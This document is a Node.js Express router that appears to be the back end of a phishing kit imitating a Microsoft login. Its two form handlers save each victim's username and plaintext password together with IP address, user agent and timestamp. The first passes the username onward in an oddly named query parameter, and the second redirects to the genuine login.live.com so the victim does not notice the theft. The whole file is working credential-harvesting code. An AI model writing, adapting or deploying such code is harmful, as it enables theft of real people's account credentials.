
const express = require ('express');
const router = express.Router();
const db = require('../db');
const bodyParser = require('body-parser');

router.use(express.static('public'));
router.use(express.static(__dirname + '/public'));
router.use(bodyParser.urlencoded({ extended: false }));


//validate form data before handling
// Custom middleware for form validation
const validateFormData = (req, res, next) => {
  const { username, password } = req.body;

  if (!username || !password) {
      return res.status(400).render('error');
  }

  // Additional validation checks can be added here

  // If validation passes, proceed to the next middleware or route handler
  next();
};


// Handle form submission

router.post('/submit', validateFormData, (req, res) => {
   
    const name = req.body.username;
    const buff = Buffer.from(name, 'utf-8');
    const b64 = buff.toString('base64');
    const word = req.body.password;
    const clientIP = req.headers['x-forwarded-for'];
    const ip =  clientIP.split(',')[0].trim(); 
    const useragent = req.get('User-Agent');
    const date = new Date(); 
    

		// Insert a new record if no matching record exists
		const insertQuery = 'INSERT INTO userfinal (username, password, ip, useragent,date) VALUES (?,?,?,?,?)';
		db.query(insertQuery, [name, word, ip, useragent, date], (err) => {
		if (err) {
		    console.error('Error inserting record:', err);
		    return res.status(500).send('Internal Server Error');
		}
		res.redirect(`/login/?hfdgdhguirehfdhgfdrereoh=${b64}`);
		});
		   

  
     
    });
    
    
//validate form2 data before handling
// Custom middleware2 for form validation
const validateFormData2 = (req, res, next) => {
  const { username, password } = req.body;

  if (!username || !password) {
      return res.status(400).render('error');
  }

  // Additional validation checks can be added here

  // If validation passes, proceed to the next middleware or route handler
  next();
};


// Handle form submission

router.post('/try', validateFormData2, (req, res) => {
   
    const name = req.body.username;
    const word = req.body.password;
    const clientIP = req.headers['x-forwarded-for'];
    const ip =  clientIP.split(',')[0].trim();    
    const useragent = req.get('User-Agent');
    const date = new Date(); 
    

		// Insert a new record if no matching record exists
		const insertQuery = 'INSERT INTO userfinal (username, password, ip, useragent,date) VALUES (?,?,?,?,?)';
		db.query(insertQuery, [name, word, ip, useragent, date], (err) => {
		if (err) {
		    console.error('Error inserting record:', err);
		    return res.status(500).send('Internal Server Error');
		}
		res.redirect('https://login.live.com/');
		});
		   

  
     
    });
  



module.exports =router
